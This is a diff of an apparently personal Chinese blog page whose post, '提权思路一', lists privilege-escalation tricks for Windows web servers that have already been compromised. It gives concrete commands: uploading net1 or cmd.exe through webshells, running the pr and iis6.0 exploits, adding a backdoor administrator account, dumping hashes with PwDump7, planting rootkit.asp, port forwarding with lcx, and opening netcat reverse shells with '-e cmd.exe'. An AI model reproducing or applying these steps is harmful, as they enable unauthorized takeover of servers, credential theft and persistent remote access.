@@ -51,13 +51,13 @@
   };
 </script>
 
-  <meta name="description" content="1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:\windows\temp\cookies\net1.exe user 2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权 3、cmd拒">
+  <meta name="description" content="1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:\windows\temp\cookies\net1.exe user2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权">
 <meta name="keywords" content="提权">
 <meta property="og:type" content="article">
 <meta property="og:title" content="提权思路一">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;22&#x2F;%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%B8%80&#x2F;index.html">
 <meta property="og:site_name" content="ClearLoveの博客">
-<meta property="og:description" content="1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:\windows\temp\cookies\net1.exe user 2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权 3、cmd拒">
+<meta property="og:description" content="1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:\windows\temp\cookies\net1.exe user2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2019-11-22T06:56:33.992Z">
 <meta name="twitter:card" content="summary">
@@ -235,27 +235,27 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <pre><code>1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user</pre></code>
-<pre><code>2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权</pre></code>
-<pre><code>3、cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以</pre></code>
-<pre><code>4、找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索</pre></code>
-<pre><code>5、c:\windows\temp\cookies\ 这个目录</pre></code>
-<pre><code>6、当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了</pre></code>
-<pre><code>7、cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”</pre></code>
-<pre><code>8、增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了</pre></code>
-<pre><code>9、有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可</pre></code>
-<pre><code>10、有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</pre></code>
-<pre><code>11、其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了</pre></code>
-<pre><code>12、用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令</pre></code>
-<pre><code>13、当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:\Documents and Settings\All Users\Application Data\Microsoft 目录 然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的</pre></code>
-<pre><code>14、有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</pre></code>
-<pre><code>15、进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</pre></code>
-<pre><code>16.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：”"c:\xxx\exp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变</pre></code>
-<pre><code>17、一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现</pre></code>
-<pre><code>18.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe >1.txt</pre></code>
-<pre><code>19.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe</pre></code>
-<pre><code>20.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。 上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs</pre></code>
-<pre><code>21.如何辨别服务器是不是内网？ 192.168.x.x 172.16.x.x 10.x.x.x</pre></code>
+        <pre><code>1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user</code></pre><pre><code>2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权</code></pre><a id="more"></a>
+
+<pre><code>3、cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以</code></pre>
+<pre><code>4、找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索</code></pre>
+<pre><code>5、c:\windows\temp\cookies\ 这个目录</code></pre>
+<pre><code>6、当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了</code></pre>
+<pre><code>7、cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”</code></pre>
+<pre><code>8、增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了</code></pre>
+<pre><code>9、有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可</code></pre>
+<pre><code>10、有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</code></pre>
+<pre><code>11、其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了</code></pre>
+<pre><code>12、用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令</code></pre>
+<pre><code>13、当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:\Documents and Settings\All Users\Application Data\Microsoft 目录 然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的</code></pre>
+<pre><code>14、有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</code></pre>
+<pre><code>15、进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</code></pre>
+<pre><code>16.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：”"c:\xxx\exp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变</code></pre>
+<pre><code>17、一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现</code></pre>
+<pre><code>18.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe >1.txt</code></pre>
+<pre><code>19.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe</code></pre>
+<pre><code>20.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。 上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs</code></pre>
+<pre><code>21.如何辨别服务器是不是内网？ 192.168.x.x 172.16.x.x 10.x.x.x</code></pre>
 <pre><code>22.什么情况下适合转发端口？
 1.服务器是内网，我们无法连接。 2.服务器上有防火墙，阻断我们的连接。
 转发端口的前提，我们是外网或是有外网服务器。
@@ -266,7 +266,7 @@
 
 以上是本机外网情况下操作，接着说下在外网服务器里如何操作：
 上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567
-接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了</pre></code>
+接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了</code></pre>
 <pre><code>23.当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。
 不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….
 找个可读可写目录上传nc.exe cmd.exe
@@ -282,7 +282,7 @@
 本地cmd执行：nc -vv -l -p 52 进行反弹 c:\windows\temp\nc.exe -e c:\windows\temp\cmd.exe 服务器ip 52
 shell执行命令c:\windows\temp\nc.exe -l -p 110 -t -e c:\windows\temp\cmd.exe
 一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:\windows\temp\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\windows\temp\cmd.exe
-这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的</pre></code>
+这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的</code></pre>
     </div>
 
     
